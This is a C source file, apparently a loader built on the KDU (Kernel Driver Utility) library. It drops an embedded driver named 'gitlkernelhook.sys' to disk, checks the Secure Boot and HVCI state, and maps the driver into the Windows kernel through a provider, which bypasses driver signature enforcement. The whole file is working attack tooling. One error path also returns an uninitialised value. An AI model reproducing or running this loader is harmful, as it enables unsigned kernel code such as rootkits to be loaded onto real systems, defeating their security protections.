#include "global.h"

#include "driverimage.h"

#define FILENAME L"gitlkernelhook.sys"

KDU_CONTEXT* g_ProvContext;

volatile LONG g_lApplicationInstances = 0;

void DropFile() {

	char filename[MAX_PATH + 1] = { 0 };
	sprintf(filename, "%ws", FILENAME);

	FILE *pFile;
	pFile = fopen(filename, "wb");
	fwrite(driver_image, sizeof(unsigned char), array_len, pFile);
	fclose(pFile);

	return;
}

BOOL CleanUp() {
	if (DeleteFileW(FILENAME) == 0) {
		printf("ERROR: During cleanup, %d", GetLastError());
		return FALSE;
	}
	
	printf("[+] CleanUp successful\n");

	return TRUE;
}

int KDUMain()
{
    OSVERSIONINFO osv;

	BOOLEAN secureBoot;
	BOOLEAN hvciEnabled, hvciStrict, hvciIUM;;

	int retVal;
	HINSTANCE hInstance = GetModuleHandle(NULL);
	wchar_t szParameter[MAX_PATH + 1] = FILENAME;
	
    RtlSecureZeroMemory(&osv, sizeof(osv));
    osv.dwOSVersionInfoSize = sizeof(osv);
    RtlGetVersion((PRTL_OSVERSIONINFOW)&osv);

	supQuerySecureBootState(&secureBoot);
	supQueryHVCIState(&hvciEnabled, &hvciStrict, &hvciIUM);

	// printf_s("[i] Windows version: %u.%u build %u, SecureBoot: %s, Windows HVCI mode: %s\n", osv.dwMajorVersion, osv.dwMinorVersion, osv.dwBuildNumber, secureBoot ? "enabled" : "disabled", hvciEnabled ? "detected" : "not detected");

	DropFile();

	if (!RtlDoesFileExists_U(szParameter)) {
		printf_s("[!] Kernel hook driver not found\r\n");
		return retVal;
	}

	g_ProvContext = KDUProviderCreate(KDU_PROVIDER_DEFAULT, hvciEnabled, osv.dwBuildNumber, hInstance, ActionTypeMapDriver);

	if (g_ProvContext) {
		retVal = KDUMapDriver(g_ProvContext, szParameter);
		KDUProviderRelease(g_ProvContext);
	}

    return retVal;
}
